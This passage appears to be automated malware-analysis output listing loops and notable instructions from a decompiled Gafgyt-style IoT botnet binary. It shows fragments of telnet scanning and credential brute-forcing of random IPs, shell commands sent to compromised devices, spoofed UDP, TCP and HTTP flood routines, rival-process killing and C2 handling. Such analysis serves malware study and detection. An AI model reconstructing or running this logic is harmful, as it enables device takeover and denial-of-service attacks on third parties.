		if (strcasestr((char *)a1, v99, 4 * v98) != 0) {
=============================WHILE LOOPS ID : 16 @ listFork ====================================
++++++++ WHILE START : 7542 
++++++++ WHILE FUNCTION : listFork 
++++++++ WHILE END : 7562 
++++++++ INTRESTING INSTRUCTIONS :  
		free();
=============================WHILE LOOPS ID : 17 @ matchPrompt ====================================
++++++++ WHILE START : 7842 
++++++++ WHILE FUNCTION : matchPrompt 
++++++++ WHILE END : 7904 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 18 @ readUntil ====================================
++++++++ WHILE START : 8013 
++++++++ WHILE FUNCTION : readUntil 
++++++++ WHILE END : 8093 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t v102 = __libc_recv(a1, v101, 1, 0, v101); // 0xa9dc
		if (strstr(a6, (char *)a2) == 0) {
		int32_t v103 = __libc_recv(a1, v101 + 1, 2, 0, v99); // 0xaa44
=============================WHILE LOOPS ID : 20 @ StartTheLelz ====================================
++++++++ WHILE START : 10302 
++++++++ WHILE FUNCTION : StartTheLelz 
++++++++ WHILE END : 10816 
++++++++ INTRESTING INSTRUCTIONS :  
		case 0: {
		GetRandomPublicIP(24, v98, v110, v112);
		socket(2, 1, 0);
		if (__libc_connect(*v109, (int32_t)&v95, 16) == -1) {
		socket(2, 1, 0);
		case 1: {
		while (true) {
		getsockopt(*v118, 1, 4, (int32_t)&v123, v123);
		case 2: {
		case 3: {
		if (__libc_send(*v128, v129, len, 0x4000) < 0) {
		if (__libc_send(*v128, (int32_t)"\r\n", 2, 0x4000) < 0) {
		case 4: {
		case 5: {
		if (__libc_send(*v133, v134, len2, 0x4000) < 0) {
		if (__libc_send(*v133, (int32_t)"\r\n", 2, 0x4000) < 0) {
		case 6: {
		get_telstate_host(v103, v98, v104);
		sockprintf(v139, (int32_t)"LOGIN FOUND - %s:%s:%s");
		case 7: {
		__libc_send(*v140, (int32_t)"sh\r\n", 4, 0x4000);
		__libc_send(*v140, (int32_t)"shell\r\n", 7, 0x4000);
		if (__libc_send(*v140, str3, len3, 0x4000) < 0) {
=============================WHILE LOOPS ID : 23 @ sendSTD ====================================
++++++++ WHILE START : 10964 
++++++++ WHILE FUNCTION : sendSTD 
++++++++ WHILE END : 10987 
++++++++ INTRESTING INSTRUCTIONS :  
		rand();
		__libc_send(v96, v108, 65, 0);
		__libc_connect(v96, v99, 16);
		__GI_close(v96);
=============================WHILE LOOPS ID : 24 @ sendUDP ====================================
++++++++ WHILE START : 11122 
++++++++ WHILE FUNCTION : sendUDP 
++++++++ WHILE END : 11162 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		__libc_sendto(v99, v100, a5, 0, (int32_t)&v95, 16);
		rand_cmwc();
=============================WHILE LOOPS ID : 25 @ sendUDP ====================================
++++++++ WHILE START : 11224 
++++++++ WHILE FUNCTION : sendUDP 
++++++++ WHILE END : 11277 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		__libc_sendto(v106, v111, a5 + 28, 0, (int32_t)&v125, (int32_t)&v125);
		*v112 = (int16_t)rand_cmwc();
		v126 = rand_cmwc();
		*(int16_t *)(v111 | 4) = (int16_t)rand_cmwc();
		*(int32_t *)(v111 + 12) = __GI_htonl(GetRandomIP(v109));
=============================WHILE LOOPS ID : 26 @ sendTCP ====================================
++++++++ WHILE START : 11463 
++++++++ WHILE FUNCTION : sendTCP 
++++++++ WHILE END : 11547 
++++++++ INTRESTING INSTRUCTIONS :  
		if (__GI_strcoll(v121, (int32_t)"rst") == 0) {
		if (__GI_strcoll(v121, (int32_t)"psh") == 0) {
		sockprintf(v97, (int32_t)"Invalid flag \"%s\"");
=============================WHILE LOOPS ID : 27 @ sendTCP ====================================
++++++++ WHILE START : 11571 
++++++++ WHILE FUNCTION : sendTCP 
++++++++ WHILE END : 11600 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_sendto(v96, v102, v100, 0, (int32_t)&v116, (int32_t)&v116);
		v109 = GetRandomIP(v99);
		*(int16_t *)(v102 | 4) = (int16_t)rand_cmwc();
		*v106 = rand_cmwc();
		*v104 = (int16_t)rand_cmwc();
		*v114 = (int16_t)tcpcsum(v102, v103);
=============================WHILE LOOPS ID : 28 @ sendTCP ====================================
++++++++ WHILE START : 11626 
++++++++ WHILE FUNCTION : sendTCP 
++++++++ WHILE END : 11641 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_sendto(v96, v102, v100, 0, (int32_t)&v116, (int32_t)&v116);
		v109 = GetRandomIP(v99);
		*(int16_t *)(v102 | 4) = (int16_t)rand_cmwc();
		*v106 = rand_cmwc();
		*v104 = (int16_t)rand_cmwc();
		*v114 = (int16_t)tcpcsum(v102, v103);
=============================WHILE LOOPS ID : 29 @ botkiller ====================================
++++++++ WHILE START : 11747 
++++++++ WHILE FUNCTION : botkiller 
++++++++ WHILE END : 11765 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_system(v96);
		__libc_system(v96);
=============================WHILE LOOPS ID : 30 @ sendHTTP ====================================
++++++++ WHILE START : 11983 
++++++++ WHILE FUNCTION : sendHTTP 
++++++++ WHILE END : 12023 
++++++++ INTRESTING INSTRUCTIONS :  
		if (__libc_fork() != 0) {
		while (true) {
		if (socket_connect(a1, a3) != 0) {
=============================WHILE LOOPS ID : 31 @ sendHTTP2 ====================================
++++++++ WHILE START : 12137 
++++++++ WHILE FUNCTION : sendHTTP2 
++++++++ WHILE END : 12179 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t v100 = rand() % 36; // 0x10638
		sprintf(v98, (int32_t)"%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", a1, a4, a2, v101, v100);
		if (__libc_fork() != 0) {
		while (true) {
		if (socket_connect(a2, a3) != 0) {
=============================WHILE LOOPS ID : 32 @ processCmd ====================================
++++++++ WHILE START : 12662 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 12679 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendTCP(v94, v111, v112, v113, v132, v96, v97);
=============================WHILE LOOPS ID : 34 @ processCmd ====================================
++++++++ WHILE START : 12784 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 12790 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 37 @ processCmd ====================================
++++++++ WHILE START : 12900 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 12951 
++++++++ INTRESTING INSTRUCTIONS :  
		sockprintf(v90, (int32_t)"None Killed.");
		sockprintf(v90, (int32_t)"Killed %d.");
		if (*v171 != __GI_getpid()) {
		kill(v173, 9);
=============================WHILE LOOPS ID : 38 @ processCmd ====================================
++++++++ WHILE START : 12970 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 12987 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendSTD(v158, v161, v162, 0);
=============================WHILE LOOPS ID : 42 @ processCmd ====================================
++++++++ WHILE START : 13075 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 13093 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendCNC(v150, v153, v154, 0);
		__GI_close(v90);
=============================WHILE LOOPS ID : 44 @ processCmd ====================================
++++++++ WHILE START : 13147 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 13153 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 48 @ processCmd ====================================
++++++++ WHILE START : 13266 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 13272 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 52 @ processCmd ====================================
++++++++ WHILE START : 13420 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 13426 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 55 @ processCmd ====================================
++++++++ WHILE START : 13490 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 13496 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 57 @ processCmd ====================================
++++++++ WHILE START : 13545 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 13551 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 61 @ processCmd ====================================
++++++++ WHILE START : 13658 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 13664 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 64 @ processCmd ====================================
++++++++ WHILE START : 13728 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 13747 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendHTTP(*v114, *(int32_t *)(v89 + 8), (int16_t)v176, v179, v177, atol(v178));
=============================WHILE LOOPS ID : 66 @ processCmd ====================================
++++++++ WHILE START : 13834 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 13840 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 69 @ processCmd ====================================
++++++++ WHILE START : 13895 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 13901 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 70 @ processCmd ====================================
++++++++ WHILE START : 13932 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 13938 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 71 @ processCmd ====================================
++++++++ WHILE START : 13985 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 13991 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 72 @ processCmd ====================================
++++++++ WHILE START : 14058 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14064 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 73 @ processCmd ====================================
++++++++ WHILE START : 14083 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14089 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 74 @ processCmd ====================================
++++++++ WHILE START : 14120 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14126 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 75 @ processCmd ====================================
++++++++ WHILE START : 14173 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14179 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 76 @ processCmd ====================================
++++++++ WHILE START : 14264 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14270 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 77 @ processCmd ====================================
++++++++ WHILE START : 14289 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14295 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 78 @ processCmd ====================================
++++++++ WHILE START : 14326 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14332 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 79 @ processCmd ====================================
++++++++ WHILE START : 14379 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14385 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 80 @ processCmd ====================================
++++++++ WHILE START : 14452 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14458 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 81 @ processCmd ====================================
++++++++ WHILE START : 14477 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14483 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 82 @ processCmd ====================================
++++++++ WHILE START : 14514 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14520 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 83 @ processCmd ====================================
++++++++ WHILE START : 14567 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14573 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 84 @ processCmd ====================================
++++++++ WHILE START : 14658 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14664 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 85 @ processCmd ====================================
++++++++ WHILE START : 14683 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14689 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 86 @ processCmd ====================================
++++++++ WHILE START : 14720 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14726 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 87 @ processCmd ====================================
++++++++ WHILE START : 14773 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14779 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 88 @ processCmd ====================================
++++++++ WHILE START : 14846 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14852 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 89 @ processCmd ====================================
++++++++ WHILE START : 14871 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14877 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 90 @ processCmd ====================================
++++++++ WHILE START : 14908 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14914 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 91 @ processCmd ====================================
++++++++ WHILE START : 14961 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14967 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 92 @ processCmd ====================================
++++++++ WHILE START : 15050 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15056 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 93 @ processCmd ====================================
++++++++ WHILE START : 15101 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15107 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 94 @ processCmd ====================================
++++++++ WHILE START : 15128 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15134 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 95 @ processCmd ====================================
++++++++ WHILE START : 15184 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15190 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 96 @ processCmd ====================================
++++++++ WHILE START : 15235 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15241 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 97 @ processCmd ====================================
++++++++ WHILE START : 15304 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15310 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 98 @ processCmd ====================================
++++++++ WHILE START : 15355 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15361 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 99 @ processCmd ====================================
++++++++ WHILE START : 15449 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15455 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 100 @ processCmd ====================================
++++++++ WHILE START : 15500 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15506 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 101 @ processCmd ====================================
++++++++ WHILE START : 15527 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15533 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 102 @ processCmd ====================================
++++++++ WHILE START : 15583 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15589 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 103 @ processCmd ====================================
++++++++ WHILE START : 15634 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15640 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 104 @ processCmd ====================================
++++++++ WHILE START : 15703 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15709 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 105 @ processCmd ====================================
++++++++ WHILE START : 15754 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15760 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 106 @ processCmd ====================================
++++++++ WHILE START : 15784 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15801 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendUDP(v95, v104, v105, v106, v107, v93, v99, v98);
=============================WHILE LOOPS ID : 107 @ processCmd ====================================
++++++++ WHILE START : 15890 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15896 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 108 @ processCmd ====================================
++++++++ WHILE START : 15962 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15968 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 109 @ processCmd ====================================
++++++++ WHILE START : 16013 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16019 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 110 @ processCmd ====================================
++++++++ WHILE START : 16040 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16046 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 111 @ processCmd ====================================
++++++++ WHILE START : 16096 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16102 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 112 @ processCmd ====================================
++++++++ WHILE START : 16147 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16153 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 113 @ processCmd ====================================
++++++++ WHILE START : 16216 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16222 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 114 @ processCmd ====================================
++++++++ WHILE START : 16300 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16306 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 115 @ processCmd ====================================
++++++++ WHILE START : 16546 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16552 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 116 @ processCmd ====================================
++++++++ WHILE START : 16604 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16610 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 117 @ processCmd ====================================
++++++++ WHILE START : 16727 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16733 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 118 @ processCmd ====================================
++++++++ WHILE START : 16800 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16806 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 119 @ processCmd ====================================
++++++++ WHILE START : 16894 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16900 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 120 @ processCmd ====================================
++++++++ WHILE START : 16952 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16958 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 121 @ processCmd ====================================
++++++++ WHILE START : 17050 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17056 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 122 @ getOurIP ====================================
++++++++ WHILE START : 17343 
++++++++ WHILE FUNCTION : getOurIP 
++++++++ WHILE END : 17446 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fdgets(v104, 0x1000, v102, v104) != 0) {
		if (strstr(v104, "\t00000000\t") != 0) {
		__GI_close(v102);
		__GI_close(v95);
		__GI_close(v95);
		__GI_close(v102);
		__GI_close(v95);
		__GI_close(v95);
		__GI_close(v102);
		__GI_close(v95);
		__GI_close(v95);
=============================WHILE LOOPS ID : 123 @ main ====================================
++++++++ WHILE START : 17681 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 18135 
++++++++ INTRESTING INSTRUCTIONS :  
		sprintf(v109, (int32_t)"\"%s%s\"\n", v105, v107 + len2, (int32_t)&v103, (int32_t)&v103, (int32_t)&v103);
		while (true) {
		while (true) {
		fgets((int32_t)&v96, 1024, v91);
		if (__GI_strcasecmp((char *)&v96, v109) == 0) {
		__GI_fclose(v110);
		int32_t v112 = __GI_fopen((int32_t)v92, (int32_t)&v111); // 0x12098
		__GI_fclose((int16_t *)v112);
		getOurIP();
		v99 = __libc_fork();
		if (__libc_fork() == 0) {
		zprintf((int32_t)"fork failed\n");
		while (true) {
		if (initConnection() != 0) {
		while (true) {
		if (initConnection() == 0) {
		getBuild();
		__GI_inet_ntoa(v113);
		sockprintf(v94, (int32_t)"BUILD %s:%s");
		while (true) {
		while (true) {
		if (recvLine(v94, (char *)&v97, 0x1000, v102) == -1) {
		while (true) {
		if (__libc_waitpid(v121, 0, 1) >= 1) {
		while (true) {
		while (true) {
		free();
		if (strstr(v102, "PING") == v102) {
		sockprintf(v94, (int32_t)"PONG");
		if (strstr(v102, "DUP") == v102) {
		zprintf((int32_t)"PEACE OUT IMMA DUP\n");
		while (true) {
		if (initConnection() == 0) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		if (listFork() == 0) {
		while (true) {
		processCmd(v147, &v108);
		processCmd(v147, &v108);
		while (true) {
		free();
		while (true) {
		if (__libc_waitpid(v121, 0, 1) < 1) {
		getBuild();
		__GI_inet_ntoa(v113);
		sockprintf(v94, (int32_t)"BUILD %s:%s");
		__libc_waitpid(v99, (int32_t)&v95, 0);
		zprintf((int32_t)"fork failed\n");
		while (true) {
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 124 @ main ====================================
++++++++ WHILE START : 18159 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 18165 
++++++++ INTRESTING INSTRUCTIONS :  
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 125 @ main ====================================
++++++++ WHILE START : 18181 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 18187 
++++++++ INTRESTING INSTRUCTIONS :  
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 126 @ main ====================================
++++++++ WHILE START : 18211 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 18217 
++++++++ INTRESTING INSTRUCTIONS :  
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 127 @ main ====================================
++++++++ WHILE START : 18233 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 18239 
++++++++ INTRESTING INSTRUCTIONS :  
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 128 @ main ====================================
++++++++ WHILE START : 18246 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 18263 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fdgets(v101, 1024, v155, v101) == 0) {
		fdpclose(v155);
		sockprintf(v94, (int32_t)"%s");
=============================WHILE LOOPS ID : 129 @ __udivsi3 ====================================
++++++++ WHILE START : 18505 
++++++++ WHILE FUNCTION : __udivsi3 
++++++++ WHILE END : 18717 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 131 @ _stdio_term ====================================
++++++++ WHILE START : 24169 
++++++++ WHILE FUNCTION : _stdio_term 
++++++++ WHILE END : 24219 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 134 @ _vfprintf_internal ====================================
++++++++ WHILE START : 24883 
++++++++ WHILE FUNCTION : _vfprintf_internal 
++++++++ WHILE END : 25649 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 136 @ _ppfs_setargs ====================================
++++++++ WHILE START : 26043 
++++++++ WHILE FUNCTION : _ppfs_setargs 
++++++++ WHILE END : 26152 
++++++++ INTRESTING INSTRUCTIONS :  
		case 256: {
		case 512: {
=============================WHILE LOOPS ID : 138 @ _ppfs_parsespec ====================================
++++++++ WHILE START : 26431 
++++++++ WHILE FUNCTION : _ppfs_parsespec 
++++++++ WHILE END : 27332 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 143 @ __GI_fgets_unlocked ====================================
++++++++ WHILE START : 28793 
++++++++ WHILE FUNCTION : __GI_fgets_unlocked 
++++++++ WHILE END : 28865 
++++++++ INTRESTING INSTRUCTIONS :  
		uint32_t v103 = getc_unlocked((int16_t *)a3); // 0x14ff8
=============================WHILE LOOPS ID : 148 @ strstr ====================================
++++++++ WHILE START : 30064 
++++++++ WHILE FUNCTION : strstr 
++++++++ WHILE END : 30183 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 152 @ strncpy ====================================
++++++++ WHILE START : 30796 
++++++++ WHILE FUNCTION : strncpy 
++++++++ WHILE END : 30830 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 153 @ strncpy ====================================
++++++++ WHILE START : 30837 
++++++++ WHILE FUNCTION : strncpy 
++++++++ WHILE END : 30891 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 159 @ strcasestr ====================================
++++++++ WHILE START : 31796 
++++++++ WHILE FUNCTION : strcasestr 
++++++++ WHILE END : 31842 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 161 @ malloc ====================================
++++++++ WHILE START : 36283 
++++++++ WHILE FUNCTION : malloc 
++++++++ WHILE END : 37719 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
		free();
		free();
		free();
		free();
		free();
		free();
		free();
		free();
		while (true) {
=============================WHILE LOOPS ID : 162 @ __malloc_consolidate ====================================
++++++++ WHILE START : 38585 
++++++++ WHILE FUNCTION : __malloc_consolidate 
++++++++ WHILE END : 38687 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 164 @ srandom_r ====================================
++++++++ WHILE START : 40829 
++++++++ WHILE FUNCTION : srandom_r 
++++++++ WHILE END : 40863 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		__GI_random_r((int32_t *)v96, (int32_t)&v107);
=============================WHILE LOOPS ID : 166 @ _stdlib_strto_l ====================================
++++++++ WHILE START : 41484 
++++++++ WHILE FUNCTION : _stdlib_strto_l 
++++++++ WHILE END : 41832 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 168 @ nprocessors_onln ====================================
++++++++ WHILE START : 42232 
++++++++ WHILE FUNCTION : nprocessors_onln 
++++++++ WHILE END : 42263 
++++++++ INTRESTING INSTRUCTIONS :  
		__GI_config_close((int32_t *)v100);
